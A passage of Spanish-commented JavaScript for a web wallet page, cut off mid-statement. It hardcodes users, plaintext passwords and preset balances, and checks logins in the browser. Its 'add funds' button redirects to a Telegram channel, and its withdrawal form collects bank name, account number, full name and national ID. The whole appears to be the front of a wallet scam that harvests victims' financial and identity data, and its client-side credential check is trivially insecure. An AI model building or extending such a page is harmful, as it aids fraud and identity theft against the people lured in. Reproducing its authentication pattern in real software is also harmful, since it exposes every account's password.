// Datos de los 100 usuarios generados (solo un ejemplo, puedes completar con los 100 usuarios)
const usuarios = [
    { usuario: "juan_perez1", contrasena: "juan6508", saldo: 1200 },
    { usuario: "maria_fernandez2", contrasena: "maria2317", saldo: 550 },
    { usuario: "carlos_rodriguez3", contrasena: "carlos6752", saldo: 2500 },
    { usuario: "laura_garcia4", contrasena: "laura9765", saldo: 5000 },
    { usuario: "pedro_lopez5", contrasena: "pedro1234", saldo: 1200 },
    { usuario: "ana_sanchez6", contrasena: "ana5678", saldo: 2500 },
    { usuario: "jose_diaz7", contrasena: "jose9876", saldo: 550 },
    { usuario: "sofia_vazquez8", contrasena: "sofia4321", saldo: 5000 },
    { usuario: "mario_perez9", contrasena: "mario7412", saldo: 2500 },
    { usuario: "elena_rodriguez10", contrasena: "elena3214", saldo: 1200 },
    // Agregar hasta completar 100 usuarios con saldos
    { usuario: "juan_perez100", contrasena: "juan1234", saldo: 2500 }
];

// Variables globales
let usuarioActual = null;
let saldo = 0.00;

// Elementos del DOM
const saldoElemento = document.getElementById('saldo');
const registroContainer = document.getElementById('registroContainer');
const monederoContainer = document.getElementById('monederoContainer');
const registroForm = document.getElementById('registroForm');
const añadirBtn = document.getElementById('añadirBtn');
const mostrarFormularioRetiroBtn = document.getElementById('mostrarFormularioRetiro');
const formularioRetiroContainer = document.getElementById('formularioRetiroContainer');
const formularioRetiro = document.getElementById('formularioRetiro');
const cerrarSesionBtn = document.getElementById('cerrarSesion');

// Función para registrar y hacer login
registroForm.addEventListener('submit', function(event) {
    event.preventDefault();
    const nombre = document.getElementById('nombre').value;
    const contrasena = document.getElementById('password').value;
    
    // Buscar usuario en la lista
    usuarioActual = usuarios.find(u => u.usuario === nombre && u.contrasena === contrasena);
    
    if (usuarioActual) {
        // Iniciar sesión y mostrar monedero
        saldo = usuarioActual.saldo;
        saldoElemento.textContent = saldo.toFixed(2);
        registroContainer.style.display = 'none';
        monederoContainer.style.display = 'block';
    } else {
        alert("Usuario o contraseña incorrectos.");
    }
});

// Función para redirigir al sitio de Telegram al hacer clic en el botón "Añadir"
añadirBtn.addEventListener('click', function() {
    // Redirigir al enlace de Telegram
    window.location.href = 'https://t.me/RG4_OFICIAL';
});

// Función para mostrar el formulario de retiro
mostrarFormularioRetiroBtn.addEventListener('click', function() {
    formularioRetiroContainer.style.display = 'block'; // Mostrar formulario de retiro
    mostrarFormularioRetiroBtn.style.display = 'none'; // Ocultar el botón de retirar
});

// Función para realizar el retiro de dinero
formularioRetiro.addEventListener('submit', function(event) {
    event.preventDefault();

    const banco = document.getElementById('banco').value;
    const nombreRetiro = document.getElementById('nombreRetiro').value;
    const cuenta = document.getElementById('cuenta').value;
    const cedula = document.getElementById('cedula').value;
    const montoRetiro = parseFloat(document.getElementById('montoRetiro').value);

    if (!banco || !nombreRetiro || !cuenta || !cedula || isNaN(montoRetiro) || montoRet